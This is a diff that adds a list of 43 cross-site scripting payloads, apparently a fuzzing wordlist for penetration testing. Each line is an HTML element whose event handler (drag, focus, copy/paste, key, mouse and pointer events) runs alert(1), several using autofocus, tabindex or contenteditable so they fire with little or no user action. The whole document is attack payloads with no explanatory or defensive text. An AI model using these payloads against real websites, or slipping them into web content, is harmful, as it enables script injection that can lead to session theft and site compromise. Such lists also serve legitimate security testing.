@@ -1,0 +1,43 @@
+<element draggable="true" ondrag="alert(1)">test</element>
+<element draggable="true" ondragend="alert(1)">test</element>
+<element draggable="true" ondragenter="alert(1)">test</element>
+<element draggable="true" ondragleave="alert(1)">test</element>
+<element draggable="true" ondragstart="alert(1)">test</element>
+<element id=x tabindex=1 onactivate=alert(1)></element>
+<element id=x tabindex=1 onbeforeactivate=alert(1)></element>
+<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>
+<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>
+<element id=x tabindex=1 onfocus=alert(1)></element>
+<element id=x tabindex=1 onfocusin=alert(1)></element>
+<element onafterscriptexecute=alert(1)><script>1</script>
+<element onbeforecopy="alert(1)" contenteditable>test</element>
+<element onbeforecut="alert(1)" contenteditable>test</element>
+<element onbeforepaste="alert(1)" contenteditable>test</element>
+<element onbeforescriptexecute=alert(1)><script>1</script>
+<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>
+<element onclick="alert(1)">test</element>
+<element oncontextmenu="alert(1)">test</element>
+<element oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<element oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<element ondblclick="alert(1)" autofocus tabindex=1>test</element>
+<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>
+<element onkeydown="alert(1)" contenteditable>test</element>
+<element onkeypress="alert(1)" contenteditable>test</element>
+<element onkeyup="alert(1)" contenteditable>test</element>
+<element onmousedown="alert(1)">test</element>
+<element onmouseenter="alert(1)">test</element>
+<element onmouseleave="alert(1)">test</element>
+<element onmousemove="alert(1)">test</element>
+<element onmouseout="alert(1)">test</element>
+<element onmouseover="alert(1)">test</element>
+<element onmouseup="alert(1)">test</element>
+<element onmousewheel=alert(1)>requires scrolling
+<element onpaste="alert(1)" contenteditable>test</element>
+<element onpointerdown=alert(1)>XSS</element>
+<element onpointerenter=alert(1)>XSS</element>
+<element onpointerleave=alert(1)>XSS</element>
+<element onpointermove=alert(1)>XSS</element>
+<element onpointerout=alert(1)>XSS</element>
+<element onpointerover=alert(1)>XSS</element>
+<element onpointerrawupdate=alert(1)>XSS</element>
+<element onpointerup=alert(1)>XSS</element>
